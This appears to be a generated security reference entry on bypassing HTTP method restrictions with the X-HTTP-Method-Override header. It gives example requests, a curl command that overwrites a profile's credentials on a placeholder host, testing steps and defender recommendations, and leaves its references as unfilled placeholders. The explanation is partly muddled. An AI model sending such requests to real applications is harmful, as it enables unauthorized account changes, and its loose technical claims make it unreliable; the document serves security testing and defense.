# X-HTTP-Method-Override Bypass Technique

## Overview

The X-HTTP-Method-Override bypass technique exploits the `X-HTTP-METHOD-OVERRIDE` HTTP header to circumvent restrictions imposed by web applications that only allow specific HTTP methods (like GET or POST) at a specific endpoint.  By injecting this header with a different HTTP method (e.g., PUT, DELETE), an attacker can trigger unintended actions, potentially leading to data manipulation, unauthorized access, or other vulnerabilities. This technique relies on the application's improper handling of the `X-HTTP-METHOD-OVERRIDE` header, often failing to sanitize or validate its value.

## Technical Details

- **Method**: HTTP Header Manipulation
- **Vulnerability**: Improper handling of the `X-HTTP-METHOD-OVERRIDE` header, often coupled with insecure input validation.  This is typically seen when a web application relies solely on the HTTP method specified in the request line and doesn't properly verify the method provided via the `X-HTTP-METHOD-OVERRIDE` header.
- **Impact**:  Successful exploitation can lead to unauthorized modification or deletion of data, escalation of privileges, and complete compromise of the web application. The severity depends on what functions are accessible through the overridden HTTP method.
- **Common Targets**: Web applications that use frameworks or libraries that haven't implemented proper sanitization or validation of HTTP headers, especially those employing legacy methods of handling HTTP requests.


## Example

Let's assume a vulnerable web application only allows POST requests to `/update_profile` to update user profiles. An attacker could use the `X-HTTP-METHOD-OVERRIDE` header to send a PUT request disguised as a POST:


Original (intended) request (PUT):
```http
PUT /update_profile HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
{ "username": "attacker", "password": "newpassword" }
```

Attack request (POST with X-HTTP-METHOD-OVERRIDE):
```http
POST /update_profile HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
X-HTTP-Method-Override: PUT
{ "username": "attacker", "password": "newpassword" }
```

This would potentially allow the attacker to update the profile with the new credentials, even though the application only explicitly allows POST requests to that endpoint.


## How to Test

### Using curl

```bash
curl -X POST -H "X-HTTP-Method-Override: PUT" -H "Content-Type: application/json" -d '{"username": "attacker", "password": "newpassword"}' http://vulnerable-app.com/update_profile
```

### Using Burp Suite

1. Intercept a legitimate POST request to the target endpoint.
2. In the request's HTTP headers tab, add a new header: `X-HTTP-Method-Override: PUT` (or any other method you want to test).
3. Forward the modified request.

### Manual Testing

1. Use your browser's developer tools (usually accessed by pressing F12).
2. Navigate to the Network tab and find the request you want to modify.
3. Add the `X-HTTP-Method-Override` header using the developer tools.  The exact way to do this varies by browser, but generally involves editing the request headers.
4. Resend the modified request.


## Security Implications

- **Bypass of Access Controls:** This technique bypasses authorization mechanisms that rely solely on the HTTP method in the request line.
- **Data Modification/Deletion:** Attackers can modify or delete sensitive data without authorization.
- **Privilege Escalation:** In some cases, overriding the HTTP method could lead to privilege escalation.
- **Denial of Service:**  While less common with this specific technique, it could be combined with other attacks to achieve a denial of service.


## Recommendations for Defenders

- **Input Validation:**  Strictly validate all HTTP headers, including `X-HTTP-Method-Override`.  Do not trust header values without verification.
- **Enforce Method Restrictions:**  Implement proper access control at the application level, checking the requested HTTP method independently of any headers.  Avoid relying solely on the request line's method.
- **Disable X-HTTP-Method-Override:**  If not strictly required, explicitly disable the handling of the `X-HTTP-Method-Override` header.
- **WAF Configuration:** Configure your Web Application Firewall (WAF) to block or inspect requests containing this header.
- **Secure Coding Practices:**  Employ secure coding practices throughout the application, especially concerning input sanitization and validation.


## Related Techniques

- HTTP Parameter Pollution
- Cross-Site Request Forgery (CSRF) (Often used in conjunction with this technique)
- Session Hijacking


## References

- OWASP Top 10 (various releases mention insecure handling of HTTP headers)
- [Add relevant CVE links if applicable]
- [Add links to relevant blog posts or research papers]

(Note:  Please replace bracketed information with actual links and CVE numbers as needed.)
